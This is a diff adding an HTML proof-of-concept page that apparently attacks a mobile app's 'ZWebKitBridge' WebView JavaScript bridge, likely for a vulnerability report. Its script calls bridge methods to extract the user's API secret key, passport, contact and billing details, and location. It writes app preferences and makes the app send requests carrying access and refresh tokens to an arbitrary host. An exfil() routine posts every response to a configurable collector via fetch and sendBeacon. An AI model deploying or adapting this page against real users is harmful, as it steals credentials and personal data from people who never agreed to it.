@@ -1,0 +1,122 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ZWebKitBridge PoC</title>
+<style>
+  body{font:16px/1.45 -apple-system,Roboto,sans-serif;margin:0;padding:18px;background:#0b0f14;color:#e6edf3}
+  h1{font-size:19px;margin:0 0 4px}
+  .sub{color:#8b949e;font-size:13px;margin-bottom:14px}
+  .row{padding:10px 12px;border-radius:8px;margin:8px 0;background:#161b22;border:1px solid #30363d}
+  .ok{border-color:#238636;background:#0f2417}
+  .bad{border-color:#da3633;background:#2a1214}
+  .warn{border-color:#9e6a03;background:#2b1f05}
+  .k{color:#8b949e;font-size:12px;text-transform:uppercase;letter-spacing:.06em}
+  pre{white-space:pre-wrap;word-break:break-all;font-size:12px;margin:6px 0 0;color:#c9d1d9}
+  #s{font-weight:700}
+</style>
+</head>
+<body>
+<h1>ZWebKitBridge PoC</h1>
+<div class="sub">If the UA below contains <b>ZWebKitContainer</b>, you are inside a bridge-enabled District WebView.</div>
+<div id="out"></div>
+
+<script>
+/* ------------------------------------------------------------------
+   CONFIG: put your collector here (webhook.site / Burp Collaborator).
+   Leave empty to only render results on screen.
+   ------------------------------------------------------------------ */
+var COLLECTOR = "";
+
+var out = document.getElementById('out');
+var results = [];
+
+function render(){
+  out.innerHTML = results.map(function(r){
+    return '<div class="row '+r.cls+'"><div class="k">'+r.title+'</div><pre>'+
+           String(r.body).replace(/&/g,'&amp;').replace(/</g,'&lt;')+'</pre></div>';
+  }).join('');
+}
+function add(title, cls, body){ results.push({title:title, cls:cls, body:body}); render(); }
+
+function exfil(tag, data){
+  if(!COLLECTOR) return;
+  var payload = JSON.stringify({tag:tag, data:data});
+  try {
+    fetch(COLLECTOR + '?tag=' + encodeURIComponent(tag),
+          {method:'POST', mode:'no-cors', keepalive:true, body:payload});
+  } catch(e) {
+    try { navigator.sendBeacon(COLLECTOR + '?tag=' + encodeURIComponent(tag), payload); } catch(_){}
+  }
+}
+
+/* The app delivers every bridge response to the TOP frame via:
+     webView.evaluateJavascript("javascript:JSBridge.invokeJS(" + json + ")")
+   (WebViewFragment$invokeJs$2.java:53-58)
+   Shape: {bridgeName, callbackId, responseData, keepCallback, msgType}      */
+window.JSBridge = {
+  invokeJS: function (msg) {
+    var name = (msg && msg.bridgeName) || '?';
+    var raw  = msg && msg.responseData;
+    var pretty = raw;
+    try { pretty = JSON.stringify(JSON.parse(raw), null, 2); } catch (e) {}
+    var cls = 'bad';
+    if (name === 'userAuthDetails' && raw && raw.indexOf('secret_key') !== -1) cls = 'ok';
+    if (name === 'getUserDetails' && raw && raw.length > 4) cls = 'ok';
+    if (name === 'httpRequest') cls = 'ok';
+    add('bridge response: ' + name, cls, pretty);
+    exfil('bridge-response', msg);
+  }
+};
+
+var UA = navigator.userAgent;
+add('page loaded', UA.indexOf('ZWebKitContainer') !== -1 ? 'ok' : 'warn', UA + '\n\nZWebKitBridge = ' + (typeof ZWebKitBridge));
+exfil('loaded', {ua: UA, hasBridge: typeof ZWebKitBridge});
+
+if (typeof ZWebKitBridge === 'undefined') {
+  add('bridge missing', 'bad', 'ZWebKitBridge is undefined — this WebView was not initialised with the bridge.');
+} else {
+  function call(name, params, id){
+    try {
+      ZWebKitBridge.postMessage(JSON.stringify({
+        bridgeName: name, params: params, msgType: 'call', callbackId: id
+      }));
+      add('sent: ' + name, 'warn', JSON.stringify(params));
+    } catch (e) {
+      add('error sending ' + name, 'bad', String(e));
+    }
+  }
+
+  setTimeout(function(){
+    /* 1. per-user API signing credential + login state
+          note: the field is @SerializedName("is_login_required") */
+    call('userAuthDetails', {is_login_required: false}, 'c1');
+
+    /* 2. PII: name / email / phone / passport / billing */
+    call('getUserDetails', null, 'c2');
+
+    /* 3. location + city */
+    call('getCity', null, 'c3');
+
+    /* 4. proof that JS can write app prefs:
+          set `theme`, then make the app send a native request — the OkHttp client
+          echoes it as the X-APP-THEME header (HeadersInterceptor.java:94-96). */
+    call('shared_prefs', {key: 'theme', value: 'poc-theme'}, 'c4');
+
+    /* 5. Finding 2: native request to an arbitrary host. Check your collector's
+          request headers for x-access-token / x-refresh-token / x-app-theme. */
+    if (COLLECTOR) {
+      call('httpRequest', {
+        method: 'GET',
+        url: COLLECTOR + '/proxy',
+        headers: {},
+        data: null,
+        authentication: {is_authenticated: false}
+      }, 'c5');
+    }
+  }, 800);
+}
+</script>
+</body>
+</html>
